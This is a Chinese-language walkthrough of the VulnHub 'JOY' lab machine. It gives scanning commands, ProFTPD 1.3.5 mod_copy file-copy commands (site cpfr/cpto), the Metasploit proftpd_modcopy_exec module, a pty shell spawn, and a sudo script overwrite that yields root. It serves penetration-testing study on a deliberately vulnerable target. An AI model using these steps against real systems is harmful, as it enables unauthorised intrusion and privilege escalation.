# vulnhub之joy的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745812&idx=1&sn=c369085c612b0e17ff631937a0b5f67a&chksm=87148ad4b06303c2b3b84c91a08cab7c38404090479b39b9448f91501dc0356cf872b2dc0806&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745812&idx=1&sn=c369085c612b0e17ff631937a0b5f67a&chksm=87148ad4b06303c2b3b84c91a08cab7c38404090479b39b9448f91501dc0356cf872b2dc0806&scene=27#wechat_redirect)

本周实践的是vulnhub的joy镜像，下载地址，https://download.vulnhub.com/digitalworld/JOY.7z，

启动靶机，知道是个debian系统，有个账户是patrick，

![](../Images/841c77442cd85fb0a05c2e538ef2ebc0.png)

先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/e9b6ca1829e687945cac46bfbc1c6750.png)

接着来个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.85，

![](../Images/972db7287d376fd14edfb3a7ec3d0b01.png)

知道用了ProFTPD，但是没扫出来版本号，此处是这个靶机奇葩的地方，好在匿名可登录，注意用anonymous登录，密码是空的，发现upload目录里有文件，而且可以下载，

![](../Images/a864e611b79732ac1f050bf3c4536483.png)

下载directory文件，查看内容发现一个叫version\_control的文件高度可疑，

![](../Images/12996efdd62a086bb97c031c86070d0a.png)

获得version\_control文件的过程有些传奇，全靠猜测，

首先是猜测当前的ProFTPD软件是1.3.5版本，那就有File Copy漏洞，

![](../Images/71751c699ba35c45508f6e260db83c2e.png)

同时还要通过经验猜测ftp和patrick目录的绝对路径，尝试后发现还真对了，

site cpfr /home/patrick/version\_control，

site cpto /home/ftp/upload/version\_control，  

![](../Images/1cccfb2f35e932707d418a7292187e5e.png)

version\_control文件这就到了ftp的upload目录里了，

![](../Images/0dc8a8813b96bc11a94c3f7643dacb01.png)

下载version\_control文件，查看内容发现ProFTPD软件还真是1.3.5版本，还提示了一个web站点的绝对路径，/var/www/tryingharderisjoy，

![](../Images/bc098f53ad627e62eddf667990377c1e.png)

因为ProFTPD1.3.5版本除了有File Copy漏洞，还有个更厉害的命令执行漏洞，这个web站点的绝对路径提示正是时候，上metasploit，

msfconsole，  
search proftpd 1.3.5，

![](../Images/6d5ac1d3841fc03409db23e89264c36e.png)  
use exploit/unix/ftp/proftpd\_modcopy\_exec  
show options

![](../Images/6411a344e708d18402f718366c22928a.png)  
set RHOSTS 192.168.137.85  
set SITEPATH /var/www/tryingharderisjo  
exploit  

![](../Images/d9d75a64baeaaa555f69053f77d7ea04.png)

拿到的shell不是root的，接下来就想办法提权，

老规矩，用python命令转成可交互的shell，

python -c 'import pty;pty.spawn("/bin/bash")'，

在ossec目录的patricksecretsofjoy文件里发现了账户密码，

patrick:apollo098765  
root:howtheheckdoiknowwhattherootpasswordis  

![](../Images/0838e0a18080cb75ec272094ae9e6549.png)

root的密码不对，patrick的密码是对的，

![](../Images/66c9bba52eb78125cb2665378abbe27d.png)

查看patrick的sudo权限，发现个彩蛋，patrick能以root权限执行/home/patrick/script/test，

![](../Images/49a14c3fce7a68f478aa2c6fba5d1cdf.png)

执行了一下当前的/home/patrick/script/test，不行，

![](../Images/e63a18ab6e9c351a5909bcd70bbfbfd4.png)

那就想办法把/home/patrick/script/test替换成自己的，

还是得利用ProFTPD1.3.5版本的File Copy漏洞，

本地先做个test文件，echo "/bin/sh" > test，并上传到ftp的upload目录，

![](../Images/0d769bdc878487849812c9a12fa62f61.png)

把ftp的upload目录下的test文件替换到/home/patrick/script/test，

site cpfr /home/ftp/upload/test，

site cpto /home/patrick/script/test，

![](../Images/8dffa6c479fcf573cf1730e876e8ca1a.png)

再次执行sudo /home/patrick/script/test，

![](../Images/e761f28cd68e489c9583e062e4e578ce.png)

至此拿root权限成功。
